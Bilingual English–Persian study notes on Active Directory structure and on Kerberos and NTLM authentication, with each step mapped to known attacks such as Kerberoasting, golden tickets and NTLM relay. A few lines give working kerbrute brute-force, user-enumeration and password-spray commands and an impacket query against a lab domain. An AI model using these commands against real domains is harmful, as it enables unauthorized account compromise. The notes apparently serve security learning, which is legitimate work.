


###### **What is the Active Directory**

uDirectory service developed by Microsoft to manage windows domain networks.

uStores information related to objects, such as Computers, Users, Printers, etc.

uAuthenticates using Kerberos tickets.

uNon-Windows devices, such as Linux machines, firewalls, etc. can also authenticate to AD via Radius or LDAP.


🟦 **سرویس دایرکتوری‌ای که توسط مایکروسافت توسعه داده شده برای مدیریت شبکه‌های دامینی ویندوز.**  
🔹 این سرویس برای مدیریت متمرکز منابع و کاربران در شبکه‌های بزرگ ویندوز استفاده می‌شود.

🟦 **اطلاعات مربوط به آبجکت‌هایی مثل کامپیوترها، کاربران، پرینترها و... را ذخیره می‌کند.**  
🔹 هر چیزی که در شبکه عضو است، به عنوان یک "Object" در این سرویس ثبت می‌شود.

🟦 **با استفاده از تیکت‌های Kerberos احراز هویت انجام می‌دهد.**  
🔹 یعنی کاربران برای ورود به سیستم، از پروتکل Kerberos استفاده می‌کنند تا هویتشان تأیید شود.

🟦 **دستگاه‌های غیر ویندوزی مانند لینوکس، فایروال‌ها و... نیز می‌توانند از طریق Radius یا LDAP به Active Directory احراز هویت شوند.**  
🔹 یعنی فقط مختص ویندوز نیست؛ سیستم‌های دیگر هم می‌تونن با استفاده از پروتکل‌های استاندارد متصل بشن.



###### **AD DS Data Stores**



uthe ADDS data store contains the database files and processes that store and manage directory information for users, services, and applications.

uThe ADDS data store:

uconsists of the Ntds.dit file

uIs stored by default in the %systemRoot%\NTDS folder on all domain controllers

uIs accessible only through domain controller process and protocols



🟦 **مخزن داده‌های ADDS شامل فایل‌های دیتابیس و فرآیندهایی است که اطلاعات دایرکتوری مربوط به کاربران، سرویس‌ها و برنامه‌ها را ذخیره و مدیریت می‌کنند.**

🟦 **مخزن داده‌های ADDS ویژگی‌های زیر را دارد:**

🔹 **شامل فایل `Ntds.dit` است**  
👉 این فایل اصلی‌ترین دیتابیس Active Directory است که تمام اطلاعات کاربران، گروه‌ها، رمزهای عبور، عضویت در گروه‌ها و غیره را نگهداری می‌کند.

🔹 **به‌صورت پیش‌فرض در مسیر `%systemRoot%\NTDS` روی تمام کنترلرهای دامنه ذخیره می‌شود**  
👉 یعنی مثلاً در مسیر `C:\Windows\NTDS` قرار دارد.

🔹 **فقط از طریق فرآیندهای Domain Controller و پروتکل‌های خاص قابل دسترسی است**  
👉 یعنی نمی‌تونی مستقیم با فایل `ntds.dit` کار کنی؛ باید از ابزارها یا سرویس‌های مخصوص مثل LDAP، Kerberos، یا RPC استفاده کنی.





###### Logical AD components

uDefines every type of object that can be stored in the directory

uEnforces rules regarding object creation and configuration.

uClass object  | what object can be created in the directory |  User, computer

uAttribute Object | Information that can be attached on object | Display Name



---

🟦 **تعریف می‌کند که چه نوع شیء‌ (Object)‌هایی می‌توانند در دایرکتوری ذخیره شوند.**

🟦 **قوانینی را درباره‌ی ایجاد و پیکربندی اشیاء اعمال می‌کند.**

---

### 🧩 دو نوع شیء اصلی در Schema:

|نوع شیء|توضیح|مثال|
|---|---|---|
|**Class Object**|مشخص می‌کند چه نوع شیء‌ می‌تواند در دایرکتوری ساخته شود|مثل: کاربر (User)، کامپیوتر (Computer)|
|**Attribute Object**|مشخص می‌کند چه اطلاعاتی می‌توان به یک شیء اضافه کرد|مثل: نام نمایشی (Display Name)، ایمیل، شماره تلفن|

---


uSchema

uForest

uTree

uDomain

uChild Domain

uGlobal Catalog

uOrganizational Unit (OU)

uGroups

uUsers and Computers

uResources (Files, Printers, etc.)



###### Schema

uThe Schema is the blueprint for Active Directory. It defines objects and attributes for all other elements within the directory (e.g., users, computers, groups).

uEvery AD forest has only one schema, which all domains within that forest share.


---

🟦 **Schema به‌عنوان نقشه‌ی ساخت (blueprint) برای Active Directory عمل می‌کند.**  
🔹 یعنی اسکیمای AD تعیین می‌کند که چه نوع اشیاء و ویژگی‌هایی (Attributes) می‌توانند در دایرکتوری وجود داشته باشند، مانند: کاربران، کامپیوترها، گروه‌ها و غیره.

🟦 **هر جنگل (Forest) در Active Directory فقط یک Schema دارد،**  
🔹 و تمام دامنه‌های (Domains) موجود در آن جنگل، از همان یک Schema استفاده می‌کنند و با هم به اشتراک می‌گذارند.



###### Forests

uThe Forest is the top-level AD container, representing the boundary of an AD instance. It is a collection of one or more AD domains that share the same schema and global catalog.

uAll domains in a forest have transitive trust relationships with each other.

uA forest is a collection of one or more domain trees.

u- Share a common schema

u- Share a common configuration partition

u- Share a common global catalog to enable searching

u- Enable trust between all domains in the forest

u- Share the Enterprise Admins and Schema Admins groups


🟦 Forest (جنگل) بالاترین سطح کانتینر در Active Directory است و محدوده یک نمونه AD را نشان می‌دهد.
🔹 جنگل مجموعه‌ای از یک یا چند دامنه AD است که اسکیمای مشترک و Global Catalog مشترک دارند.

🟦 تمام دامنه‌های داخل یک جنگل با هم روابط اعتماد (Trust) گذرای متقابل دارند.

🟦 جنگل شامل یک یا چند درخت دامنه (Domain Tree) است.

### ویژگی‌های یک Forest:

- اشتراک یک اسکیمای مشترک
    
- اشتراک یک پارتیشن پیکربندی مشترک
    
- اشتراک یک Global Catalog مشترک برای امکان جستجو
    
- ایجاد اعتماد متقابل بین تمام دامنه‌های داخل جنگل
    
- اشتراک گروه‌های Enterprise Admins و Schema


###### Trees
uWithin a forest, you can have multiple Trees. A tree is a hierarchy of domains within a single namespace.

uA domain trees is a hierarchy of domains in ADDS

uAll domains in the tree:

u- share a contiguous namespace with the parent domain.

u- Can have additional child domains.

u- By default create a two-way transitive trust with other domains




🟦 **در یک Forest می‌توان چندین Tree داشت.**  
🔹 Tree یا درخت، سلسله مراتبی از دامنه‌ها در داخل یک فضای نام (Namespace) واحد است.

🟦 **درخت دامنه، یک سلسله مراتب از دامنه‌ها در Active Directory Domain Services (ADDS) است.**

---

### ویژگی‌های تمام دامنه‌ها در یک Tree:

- دارای فضای نام متصل (Contiguous Namespace) با دامنه والد (Parent Domain) هستند.
    
- می‌توانند دامنه‌های فرزند (Child Domains) اضافی داشته باشند.
    
- به‌صورت پیش‌فرض، اعتماد (Trust) دوطرفه و گذرا (Two-way Transitive Trust) با سایر دامنه‌ها ایجاد می‌کنند.

###### Domains

uA Domain is the primary organizational unit in AD, which is also a security boundary. It includes user, group, and computer accounts within that specific domain.

uDomains within a forest have trusts established, allowing users in one domain to access resources in another.

uDomains are used to group and manage objects in an organization

usoheil.lab

u-An administrative boundary for applying policies to groups of objects

u- A replication boundary for replicating data between domain controllers.

u-An authentication and authorization boundary that providess a way to limit the scope of access to resources.



---

🟦 **دامنه (Domain) واحد سازمانی اصلی در Active Directory است که به‌عنوان یک مرز امنیتی نیز عمل می‌کند.**  
🔹 دامنه شامل حساب‌های کاربری، گروه‌ها و کامپیوترهایی است که در آن دامنه خاص قرار دارند.

🟦 **دامنه‌ها درون یک جنگل (Forest) با هم اعتماد (Trust) برقرار کرده‌اند، که این امکان را می‌دهد کاربران در یک دامنه به منابع دامنه دیگر دسترسی داشته باشند.**

🟦 **دامنه‌ها برای گروه‌بندی و مدیریت اشیاء در یک سازمان استفاده می‌شوند.**

---

مثال: `charon.lab`

- یک مرز مدیریتی برای اعمال سیاست‌ها به گروه‌هایی از اشیاء
    
- یک مرز تکثیر (Replication Boundary) برای تکرار داده‌ها بین کنترلرهای دامنه
    
- یک مرز احراز هویت و مجوزدهی که امکان محدود کردن دسترسی به منابع را فراهم می‌کند


###### Child Domain

uA Child Domain is a subdomain of a parent domain, forming part of the hierarchical structure within a tree.

uChild domains allow better organization and delegation of administrative authority within the AD environment.


🟦 **دامنه فرزند (Child Domain) زیر دامنه‌ای از دامنه والد (Parent Domain) است که بخشی از ساختار سلسله‌مراتبی در یک درخت (Tree) محسوب می‌شود.**

🟦 **دامنه‌های فرزند امکان سازماندهی بهتر و تفویض اختیار مدیریتی دقیق‌تر در محیط Active Directory را فراهم می‌کنند.**



###### Global Catalog (GC)


uThe Global Catalog is a searchable index of all objects in the AD forest.

uIt contains a partial replica of every object in every domain, allowing users to find AD resources regardless of domain.

uGlobal Catalog servers are often placed at strategic locations within the AD environment to facilitate quick access to directory data.


🟦 **Global Catalog یک فهرست جستجوپذیر از تمام اشیاء موجود در جنگل Active Directory است.**

🟦 **این فهرست شامل یک نسخه‌ی جزئی (Partial Replica) از هر شیء در هر دامنه است که به کاربران اجازه می‌دهد منابع AD را بدون توجه به دامنه‌شان پیدا کنند.**

🟦 **سرورهای Global Catalog معمولاً در موقعیت‌های استراتژیک در محیط AD قرار داده می‌شوند تا دسترسی سریع به داده‌های دایرکتوری فراهم شود.**



###### Organizational Units (Ous)

uOUs are containers within a domain used to organize and manage resources like users, groups, and computers.

uThey allow for the delegation of administrative control and the application of Group Policy settings.

uOus are active directory containers that can contain users, groups, computers, and other OUs.

u- Represent your organization hierarchically and logically

u- Manage a Collection of objects in a consistent way

u- Delegate permissions to administer groups of objects

u- Apply policies.



🟦 **OUها (Organizational Units) کانتینرهایی در داخل یک دامنه هستند که برای سازماندهی و مدیریت منابعی مانند کاربران، گروه‌ها و کامپیوترها استفاده می‌شوند.**

🟦 **آن‌ها امکان تفویض کنترل مدیریتی و اعمال تنظیمات Group Policy را فراهم می‌کنند.**

🟦 **OUها کانتینرهای Active Directory هستند که می‌توانند شامل کاربران، گروه‌ها، کامپیوترها و سایر OUها باشند.**



###### Objects

uUser  :Enables network resource access for a user

uInetOrgPerson : Similar to a user account and Used for compatibility with other directory services

uContacts : Used primarily to assign e-mail addresses to external users. Does not enable network access.

uGroups : Used to simplify the administration of access control.

uComputers : Enables authentication and auditing of computer access to resources

uPrinters :Used to simplify the process of locating and connecting to printers.

uShared folders :Enables users to search for shared folders based on properties


🟦 **User:**  
امکان دسترسی به منابع شبکه را برای یک کاربر فراهم می‌کند.

🟦 **InetOrgPerson:**  
مشابه حساب کاربری است و برای سازگاری با سایر سرویس‌های دایرکتوری استفاده می‌شود.

🟦 **Contacts:**  
عمدتاً برای اختصاص دادن آدرس‌های ایمیل به کاربران خارجی استفاده می‌شود. امکان دسترسی به شبکه را فراهم نمی‌کند.

🟦 **Groups:**  
برای ساده‌سازی مدیریت کنترل دسترسی استفاده می‌شوند.

🟦 **Computers:**  
امکان احراز هویت و حسابرسی دسترسی کامپیوترها به منابع را فراهم می‌کند.

🟦 **Printers:**  
برای ساده‌سازی فرایند پیدا کردن و اتصال به پرینترها استفاده می‌شود.

🟦 **Shared folders:**  
امکان جستجو کاربران برای پوشه‌های به اشتراک گذاشته شده بر اساس ویژگی‌ها را فراهم می‌کند.




###### Security Identifiers (SID), Relative Identifiers (RID), and Globally Unique Identifiers (GUID)

SID: Unique identifier for each object.

RID: The unique portion of a SID within a domain.

GUID: A 128-bit unique identifier for AD objects.


🟦 **SID:** شناسه‌ی منحصر به فرد برای هر شیء (Object) در سیستم.

🟦 **RID:** بخش منحصر به فرد یک SID در داخل یک دامنه.

🟦 **GUID:** شناسه‌ی ۱۲۸ بیتی یکتا برای اشیاء Active Directory.





###### Distinguished Names (DN) and User Principal Names (UPN)

uDN: A unique identifier specifying an object’s position in the AD hierarchy.

uUPN: A simplified login format for users soheil@soheil.lab


🟦 **DN (Distinguished Name):** شناسه‌ای منحصر به فرد که موقعیت یک شیء را در سلسله‌مراتب Active Directory مشخص می‌کند.

🟦 **UPN (User Principal Name):** قالب ساده‌شده‌ای برای ورود کاربران، مانند: `soheil@soheil.lab`



###### Physical Components of Active Directory

uPhysical components represent the infrastructure supporting AD’s functionality, including server roles, replication, and network layout, which ensure AD data is available and synchronized across locations.

uDomain Controllers (DCs)

uGlobal Catalog Servers

uSites

uSubnets

uReplication

uRead-Only Domain Controllers (RODCs)

uFlexible Single Master Operations (FSMO) Roles

🟦 **کامپوننت‌های فیزیکی نمایانگر زیرساخت‌هایی هستند که عملکرد Active Directory را پشتیبانی می‌کنند، از جمله نقش‌های سرور، تکثیر داده‌ها و ساختار شبکه، که اطمینان می‌دهند داده‌های AD در مکان‌های مختلف در دسترس و هماهنگ باشند.**

---

### اجزای اصلی کامپوننت‌های فیزیکی:

- **کنترل‌کننده‌های دامنه (Domain Controllers – DCs)**
    
- **سرورهای Global Catalog**
    
- **سایت‌ها (Sites)**
    
- **ساب‌نت‌ها (Subnets)**
    
- **تکثیر داده‌ها (Replication)**
    
- **کنترل‌کننده‌های دامنه فقط خواندنی (Read-Only Domain Controllers – RODCs)**
    
- **نقش‌های عملیات تک‌سرور انعطاف‌پذیر (Flexible Single Master Operations – FSMO Roles)**

---

### ویژگی‌های OUها:

- نمایانگر سازمان شما به صورت سلسله‌مراتبی و منطقی هستند
    
- مدیریت مجموعه‌ای از اشیاء را به شکل یکپارچه فراهم می‌کنند
    
- اجازه می‌دهند مجوزها برای مدیریت گروه‌هایی از اشیاء تفویض شود
    
- امکان اعمال سیاست‌ها (Policy) را فراهم می‌کنند





---

### 📘 تصور کن یک شرکت بین‌المللی داریم:

اسمش هست: **TechWorld Inc**

این شرکت چند شعبه در کشورهای مختلف داره. هر شعبه هم خودش ممکنه چند بخش مختلف داشته باشه. حالا بیایم اینو با مفاهیم **Active Directory** مقایسه کنیم.

---

### 🟢 **Forest (جنگل)**

🔸 Forest یعنی **مجموعه‌ای از همه‌ی درخت‌ها (Treeها)** در یک اکوسیستم که به هم متصل هستن و اعتماد متقابل بینشون وجود داره.

🔹 در مثال ما، کل شرکت TechWorld Inc با تمام شعباتش و ساختارهای داخلی‌ش میشه یک **Forest**.  
همه‌ی ساختارهای دامنه‌ای که به هم وصلن و با هم کار می‌کنن توی این جنگل قرار دارن.

---

### 🌳 **Tree (درخت)**

🔸 یک Tree شامل یک دامنه اصلی (Parent Domain) و همه Child Domainهای اون هست.

🔹 مثلاً شعبه اروپا (Europe.TechWorld.com) با زیرشاخه‌هاش مثل Germany.Europe.TechWorld.com و France.Europe.TechWorld.com میشه یک **Tree**.

🔸 همه این دامنه‌ها یه ساختار نام‌گذاری سلسله‌مراتبی دارند و با هم ارتباط دارن.

---

### 🏢 **Domain (دامنه)**

🔸 دامنه یعنی یک **مرجع مدیریتی مستقل** که یک مجموعه از منابع (کاربرها، گروه‌ها، کامپیوترها و غیره) رو کنترل می‌کنه.

🔹 مثلاً شعبه آلمان از شرکت ما که اسم دامنه‌اش هست: **Germany.Europe.TechWorld.com**  
توی این دامنه، مدیر IT فقط به منابع داخل آلمان دسترسی داره و اونجا رو مدیریت می‌کنه.

---

### 👶 **Child Domain (دامنه فرزند)**

🔸 این‌ها دامنه‌هایی هستن که زیرمجموعه یک دامنه دیگه (Parent) هستن و می‌تونن قوانین و مدیریت خودشونو داشته باشن، ولی بخشی از ساختار بالاتر هستن.

🔹 مثلاً:

- **Europe.TechWorld.com** ➜ دامنه مادر
    
- **Germany.Europe.TechWorld.com** ➜ دامنه فرزند
    
- **Berlin.Germany.Europe.TechWorld.com** ➜ دامنه فرزندِ فرزند
    

---

### 🧠 جمع‌بندی با مثال:

|مفهوم|مثال در دنیای واقعی|مثال فنی در AD|
|---|---|---|
|Forest|شرکت TechWorld با همه‌ی شعبه‌هاش|TechWorld.local|
|Tree|شاخه اروپا با همه‌ی دامنه‌هاش|Europe.TechWorld.local|
|Domain|شعبه آلمان|Germany.Europe.TechWorld.local|
|Child Domain|شهر برلین در شعبه آلمان|Berlin.Germany.Europe.TechWorld.local|

---


---

## 🧠 تعریف ساده:

**Global Catalog (GC)** یعنی:

> «یک پایگاه داده مخصوص که اطلاعات **اصلی و عمومی همه‌ی دامنه‌های داخل یک Forest** رو نگه می‌داره، تا بتونه سریع جست‌وجو انجام بده، بدون اینکه به هر دامنه جداگانه وصل بشه.»

---

## 📚 مثال مفهومی:

فرض کن شرکت TechWorld یه ساختار جنگلی (Forest) داره با چندین دامنه:

- **HeadOffice.TechWorld.com**
    
- **Germany.TechWorld.com**
    
- **France.TechWorld.com**
    
- **Japan.TechWorld.com**
    

تو الان توی دامنه‌ی HeadOffice هستی و می‌خوای دنبال یه کاربر بگردی که فقط اسم کوچیکش رو می‌دونی: `Ali`  
ولی نمی‌دونی اون کاربر توی کدوم دامنه هست. حالا اگه Global Catalog نداشته باشی، باید بری تک‌تک دامنه‌ها رو بگردی. یعنی:

1. HeadOffice رو بگرد
    
2. Germany رو بگرد
    
3. France رو بگرد
    
4. Japan رو بگرد  
    و این خیلی کند و ناکارآمده! 😵
    

---

## 🌟 نقش Global Catalog:

اینجا Global Catalog وارد میشه:  
Global Catalog یک نسخه خلاصه‌شده از **ویژگی‌های اصلی** همه‌ی آبجکت‌های همه‌ی دامنه‌ها رو داره.  
بنابراین، وقتی دنبال "Ali" می‌گردی، فقط به GC وصل میشی، و اون سریع بهت میگه مثلاً:

> «Ali در دامنه Germany.TechWorld.com وجود داره، نام کاربریش ali.karimi هست، و عضوش در گروه HR هست.»

و تو خیلی سریع کارتو انجام می‌دی.

---

## ✅ چی توی Global Catalog ذخیره میشه؟

نه کل اطلاعات همه دامنه‌ها! فقط:

- اسم‌ها
    
- SID (شناسه امنیتی)
    
- عضویت در گروه‌ها
    
- ایمیل
    
- ویژگی‌های پرجست‌وجو  
    و هر چیزی که AD تعیین کنه به عنوان "Partial Attribute Set"
    

---

## 📌 نکات مهم درباره GC:

|نکته|توضیح|
|---|---|
|نوع سرور|GC روی Domain Controller نصب میشه (میتونه نقش جداگانه باشه یا ترکیبی)|
|نقش مهم در لاگین|اگه کاربر بخواد به منابع بین دامنه‌ای وصل بشه، GC بررسی می‌کنه عضو چه گروه‌هایی هست|
|در Outlook/Exchange|GC لازمه برای پیدا کردن کاربرها توی Address Book|
|بهتره هر سایت AD یه GC داشته باشه؟|بله، برای افزایش سرعت و کاهش مصرف پهنای باند|

---

### 1. **TGT Request (AS-REQ)**

**Attack: AS-REP Roasting**


- **Description**: The TGT request (AS-REQ) is the first step where a client requests a Ticket Granting Ticket (TGT) from the Authentication Server (AS). In some cases, users might have the "Do not require Kerberos preauthentication" setting enabled, which means no initial verification is needed before the AS responds.
- **Vulnerability**: If preauthentication is disabled, the attacker can request an AS-REP message without providing credentials and receive an encrypted response based on the user’s password hash. This response can be brute-forced offline to crack the user’s password.

user password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC to authenticate the user KDC checks user information (logon restriction group membership ,etc) and create TGT



**Kerberos pre-authentication** is an additional security measure in the Kerberos authentication protocol that requires the client to prove their identity to the **Key Distribution Center (KDC)** before the KDC will issue a **Ticket Granting Ticket (TGT)**. This process helps prevent certain types of attacks, such as offline password-guessing attacks, by requiring clients to demonstrate knowledge of their credentials before receiving a response from the KDC.

### How Kerberos Pre-Authentication Works

In the Kerberos authentication process, pre-authentication takes place during the initial **AS-REQ (Authentication Service Request)** step, which is when the client first requests a TGT from the KDC.

1. **Pre-Authentication Requirement**:
    
    - By default, Kerberos in Active Directory requires pre-authentication. This means that the KDC expects the client to include an encrypted timestamp in the **AS-REQ** message.
    - The timestamp is encrypted with the user's password hash, which serves as proof that the client possesses the correct credentials.
2. **Process of Pre-Authentication**:
    
    - The client encrypts the current timestamp with its **Kerberos key** (derived from the user's password hash) and sends it to the KDC along with the AS-REQ.
    - The KDC receives this AS-REQ message and decrypts the timestamp using the user’s stored password hash.
    - If the timestamp is valid and decrypts correctly, it confirms that the client possesses the correct password. The KDC then proceeds with the authentication process and issues a TGT.
3. **If Pre-Authentication Fails**:
    
    - If the pre-authentication timestamp is invalid or missing, the KDC denies the request, and the user is not authenticated. This protects against unauthorized access and password-guessing attacks, as the attacker cannot proceed without the correct password hash.

### Purpose of Pre-Authentication in Kerberos

- **Defense Against Replay Attacks**: By using a timestamp, Kerberos pre-authentication ensures that attackers cannot simply reuse (replay) an old AS-REQ message to gain access.
- **Protection Against Offline Password Attacks**: If pre-authentication is enabled, attackers cannot send repeated requests to the KDC to retrieve encrypted TGTs that could be subjected to offline password-guessing attacks.

### Pre-Authentication and Attacks

**AS-REP Roasting**: If pre-authentication is disabled for a user, it opens up a vulnerability known as **AS-REP Roasting**. When pre-authentication is disabled, the KDC will respond with an encrypted TGT even if no timestamp is provided. This TGT is encrypted with the user's password hash. An attacker could capture this encrypted TGT and perform an offline password-guessing attack against it, attempting to crack the password hash.




### 2. **TGT + Session Key (AS-REP)**

**Attack: None specific, but weak accounts can be targeted by AS-REP Roasting here**

- **Description**: In this step, the AS sends the TGT and a session key back to the client. The TGT is encrypted with the KDC’s (Key Distribution Center’s) long-term secret, while the session key is encrypted with the user's password hash.
- **Vulnerability**: If the password is weak, attackers may have a better chance of cracking it if they already have obtained the AS-REP response through AS-REP Roasting. Additionally, a compromised KDC would allow attackers to decrypt any TGT responses.

TGT is encrypted, signed and delivered to the user 
only the kerberos service (KRBTGT) in the domain can open and read TGT data

 **Example:**
 
ldap query:
```
impacket-GetADUsers -all 'soheil.lab/administrator:P@ssw0rd0'
```

kerberos steps:

```
kerbrute bruteuser   password.txt   'administrator' --dc dc.soheil.lab -d soheil.lab
```

```
kerbrute userenum username.list -d soheil.lab --dc dc.soheil.lab
```

```
kerbrute passwordspray -d 'soheil.lab' --dc 'dc.soheil.lab'  username.list 'P@ssw0rd'
```


### 3. **Ticket Request + Auth (TGS-REQ)**

**Attack: Kerberoasting**

- **Description**: In the TGS-REQ step, the client uses the TGT to request a Ticket Granting Service (TGS) ticket to access a particular service. The client includes an authenticator (encrypted with the session key) to prove their identity.
- **Vulnerability**: In Kerberoasting, attackers request service tickets for high-privilege service accounts. Since these service tickets are encrypted with the NTLM hash of the service account, attackers can retrieve these tickets and crack them offline to discover the service account’s plaintext password.

user present TGT to the DC request a Ticket Granting Service (TGS) ticket
kdc opens the tgt and validation Privilege Attribute Certificate (PAC)



### 4. **Ticket + Auth (TGS-REP)**

**Attack: Silver Ticket Attacks**

- **Description**: In this step, the KDC provides the client with the TGS ticket that is encrypted with the target service's NTLM hash and a session key. This ticket allows the client to authenticate directly to the service.
- **Vulnerability**: If attackers have a service account’s NTLM hash, they can forge a TGS (Silver Ticket) for that service, enabling them to access the service without involving the KDC, thus bypassing centralized logging and monitoring.


TGS is encrypted with target service accounts NTLM password hash and sent to the user (e.g IIS_Admin account NTLM hash for HTTP service)
kerberoast attack here


### 5. **Service Request + Auth (AP-REQ)**

**Attacks: Overpass-the-Hash, Pass-the-Ticket**

- **Description**: In the AP-REQ step, the client presents the service ticket to the application server along with an authenticator, allowing the server to verify the client’s identity and establish a session.
- **Vulnerability**:
    - **Overpass-the-Hash**: An attacker with an NTLM hash can use it to request a Kerberos ticket from the KDC, which can then be used in an AP-REQ message, allowing them to authenticate as the user without knowing the plaintext password.
    - **Pass-the-Ticket**: If attackers have access to a system, they can extract valid tickets (like TGTs or TGS) from memory and reuse them. By reusing these tickets, attackers can impersonate the ticket’s original owner on other systems within the network.


the user/client connects to the network service and presents the TGS to the network service for a resource
the service opens the tgs ticket using its ntlm password hash


### 6. **Server Authorization**

**Attack: Golden Ticket Attack**

- **Description**: In this final step, the application server validates the service ticket, allowing the client access based on the user's permissions and group memberships.
- **Vulnerability**: In a Golden Ticket attack, attackers forge TGTs using the KRBTGT account’s hash. With this forged ticket, attackers can impersonate any user and gain full access to resources, effectively bypassing all other Kerberos validation steps since the KDC trusts tickets signed with its own secret.


the network service verifies the TGS and decides whether to grant or deny the client access to the requested resource.



### Summary Table:

|**Kerberos Step**|**Associated Attack**|**Attack Description**|
|---|---|---|
|**TGT Request (AS-REQ)**|AS-REP Roasting|Exploits accounts without preauthentication to obtain AS-REP messages and crack the user’s password.|
|**TGT + Session Key (AS-REP)**|AS-REP Roasting (vulnerable accounts)|Weak account passwords may allow offline cracking if AS-REP messages are acquired through AS-REP Roasting.|
|**Ticket Request + Auth (TGS-REQ)**|Kerberoasting|Requests service tickets to crack service account passwords offline.|
|**Ticket + Auth (TGS-REP)**|Silver Ticket Attack|Creates forged TGS tickets to access services directly, bypassing the KDC.|
|**Service Request + Auth (AP-REQ)**|Overpass-the-Hash, Pass-the-Ticket|Reuses tickets or hashes to authenticate without a plaintext password.|
|**Server Authorization**|Golden Ticket Attack|Forged TGTs using the KRBTGT hash allow unlimited access and impersonation across the domain.|

### **What is the Privilege Attribute Certificate (PAC)?**

- The PAC is a Microsoft extension to the standard Kerberos protocol, specifically designed for Windows environments.
- It is a data structure that is attached to the Kerberos **Ticket Granting Ticket (TGT)** and **service tickets** issued during authentication. The PAC contains **authorization information** about the user, including:
    - **User's Security Identifier (SID)**: A unique identifier for the user.
    - **Group Memberships**: A list of all the groups the user belongs to.
    - **User Privileges and Rights**: Specifies rights such as whether the user can act as an administrator or perform certain tasks.
    - **Other Authorization Information**: Includes information relevant to controlling user access in the Windows environment.

### 2. **Role of the PAC in Kerberos Authentication**

- In standard Kerberos, the ticket only proves a user’s identity. However, Windows requires additional information to authorize access to resources based on the user’s role and permissions. This is where the PAC comes in—it allows Kerberos to convey **both identity and authorization information**.
    
- The PAC is embedded in Kerberos tickets during the following steps in authentication:
    
    **a. TGT Issuance (AS-REP)**
    
    - When a user authenticates to the **Key Distribution Center (KDC)**, the **Authentication Service (AS)** component issues a TGT in response to the **AS-REQ** (authentication request).
    - The KDC includes the PAC in the TGT so that subsequent requests by the user carry this authorization information. The PAC enables services to verify not only the identity of the user but also their permissions.
    
    **b. Service Ticket Issuance (TGS-REP)**
    
    - When the client presents the TGT to request access to a specific service (in the **TGS-REQ** step), the **Ticket Granting Service (TGS)** issues a service ticket containing the PAC in its **TGS-REP** response.
    - This service ticket is sent to the application server, allowing the application to evaluate the user’s access rights based on the information in the PAC.
    
    **c. Authorization by the Application Server**
    
    - When the client uses the service ticket to access a resource, the application server inspects the PAC to determine the user’s group memberships and permissions.
    - Based on the information in the PAC, the application server can make access-control decisions, allowing or denying access to specific resources according to the user's privileges.

### 3. **Security and Integrity of the PAC**

- To ensure the integrity and authenticity of the PAC, the KDC signs the PAC with a cryptographic signature. The domain controller's **KRBTGT** account and the **server’s secret key** are used to sign and encrypt the PAC, so it can be validated by the application server.
- This design prevents attackers from tampering with the PAC data (e.g., adding unauthorized group memberships) and is essential for the security of authorization within the Windows environment.

### 4. **Common Uses of PAC in Kerberos Authentication**

- **User Authorization**: The PAC is primarily used for authorization decisions based on user privileges in a Windows domain. It helps servers make granular access decisions based on group memberships and user rights.
- **Single Sign-On (SSO)**: In a Single Sign-On context, the PAC provides a way for applications to receive both the user's identity and their permissions without requiring additional authentication steps.
- **Access Control in Services and Applications**: Any Kerberos-authenticated application that supports Windows integrated authentication can rely on the PAC to enforce access control policies based on the user's attributes.

### 5. **Root Cause of Security Issues Involving PAC**

- **PAC Manipulation**: Attackers who can forge PACs or manipulate their contents can escalate privileges. For example, in a **Golden Ticket** attack, attackers generate a TGT with a forged PAC that contains additional privileges or unauthorized group memberships.
- **PAC Validation**: Not all applications validate the PAC properly, which could allow attackers to bypass security checks if they manage to inject a manipulated PAC.




NTLM (NT LAN Manager) authentication is a challenge-response authentication protocol used by Microsoft. While it’s generally considered less secure than Kerberos, it’s still widely used, especially in scenarios where Kerberos is not supported. Here’s a breakdown of the NTLM authentication process and the types of attacks that can target each step.


### NTLM Authentication Steps and Associated Attacks

The NTLM authentication process has three primary steps:

1. **Negotiation (Negotiate Message)**
2. **Challenge (Challenge Message)**
3. **Authentication (Authenticate Message)**

Let’s go through each step in detail, including the types of attacks that can be leveraged.


### 1. **Negotiation (Negotiate Message)**

**Description**:

- In the first step, the client sends a Negotiate message to the server to indicate that it wants to authenticate using NTLM. This message includes information about the client’s capabilities, including the security features it supports, such as NTLM v1 or v2, and whether NTLM signing is enabled.

**Attacks at this Step**:

- **Man-in-the-Middle (MitM) Attack**:
    - **Explanation**: An attacker could intercept and modify the Negotiate message in a MitM attack to downgrade the security features of NTLM, such as disabling NTLM signing or forcing NTLMv1 instead of NTLMv2.
    - **Root Cause**: Lack of mutual authentication and a reliance on weaker encryption in NTLMv1 make it vulnerable to MitM attacks.
- **Downgrade Attack**:
    - **Explanation**: If NTLMv1 is supported by the server, an attacker could attempt to force a downgrade from NTLMv2 to NTLMv1, which has weaker encryption and is easier to exploit.
    - **Root Cause**: Allowing both NTLMv1 and NTLMv2 in the environment increases vulnerability to downgrade attacks.

### 2. **Challenge (Challenge Message)**

**Description**:

- After receiving the Negotiate message, the server responds with a Challenge message, which includes a randomly generated nonce (a unique number) that the client will use to create a hashed response. This challenge is sent to the client to ensure that it can respond correctly without sending the plaintext password.

**Attacks at this Step**:

- **NTLM Relay Attack**:
    - **Explanation**: In a relay attack, an attacker intercepts the Challenge message from the server and relays it to a different target server, tricking it into authenticating the attacker as the legitimate user.
    - **Root Cause**: Lack of mutual authentication and the ability to forward NTLM challenges allow attackers to impersonate users by relaying challenges to other systems.
- **Pass-the-Hash (PTH) Attack**:
    - **Explanation**: If the attacker already has the NTLM hash of the user’s password, they can use it to respond to the challenge without needing the plaintext password.
    - **Root Cause**: NTLM allows authentication with the hash alone, making it vulnerable if attackers have access to the hashed password.

### 3. **Authentication (Authenticate Message)**

**Description**:

- In the final step, the client sends an Authenticate message, which contains the username, a hashed response to the server’s challenge, and additional information. The server then verifies the response by comparing it with its own computed hash to authenticate the client.

**Attacks at this Step**:

- **Pass-the-Hash (PTH) Attack**:
    - **Explanation**: If the attacker has obtained the NTLM hash of a user, they can create the correct Authenticate message without needing the plaintext password, effectively impersonating the user.
    - **Root Cause**: NTLM authentication can rely solely on the hash, so attackers who obtain the NTLM hash can authenticate without knowing the original password.
- **Credential Forwarding** (sometimes also referred to as **Pass-the-Credential**):
    - **Explanation**: Attackers who gain access to an authenticated session can reuse the session credentials to authenticate to other services, allowing lateral movement within the network.
    - **Root Cause**: Cached or stored credentials in memory can be captured and reused by attackers, especially if administrative privileges are compromised.

### Summary Table of NTLM Authentication Steps and Associated Attacks

| **NTLM Authentication Step**              | **Associated Attack**           | **Attack Description**                                                                                    |
